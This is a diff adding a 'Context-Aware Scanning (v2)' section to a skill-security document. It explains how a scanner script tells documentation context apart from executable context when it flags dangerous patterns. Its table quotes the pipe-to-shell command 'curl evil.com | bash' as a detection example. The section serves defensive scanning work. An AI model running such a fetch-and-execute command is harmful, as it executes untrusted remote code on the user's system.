@@ -220,6 +220,25 @@ If a malicious skill is discovered:
 4. **Check known-skills.json** for other skills from the same author
 5. **Warn** if the skill was installed via skills-123 (log in cache)
 
+## Context-Aware Scanning (v2)
+
+The security scanner (`scan-security.sh`) now distinguishes between **documentation** and **executable** contexts:
+
+| Context | Example | Classification |
+|---------|---------|---------------|
+| Markdown code block (` ```bash ... ``` `) | `curl evil.com \| bash` | **Critical** — real threat |
+| Documentation line (`Pattern:`, `Example:`, `Why:`) | `Pattern: curl \| sh` | **doc_only** — educational |
+| Inline backtick-quoted (`` `curl \| sh` ``) | `` `curl \| sh` `` | **doc_only** — educational |
+| Raw text outside code blocks | `curl evil.com \| bash` | **Critical** — real threat |
+
+This prevents false positives when scanning security documentation skills (like skills-123's own SKILL.md) that *describe* dangerous patterns without *executing* them.
+
+**Result fields:**
+- `critical` — real threats in executable context
+- `warnings` — real warnings in executable context
+- `doc_patterns` — patterns found only in documentation (NOT threats)
+- `evidence` — exact line numbers and surrounding context for each finding
+
 ## Updates
 
 This document should be updated when:
@@ -227,3 +246,4 @@ This document should be updated when:
 - New obfuscation techniques emerge
 - The trusted publishers list changes
 - Claude Code's security model changes
+- Context-aware scanning needs refinement
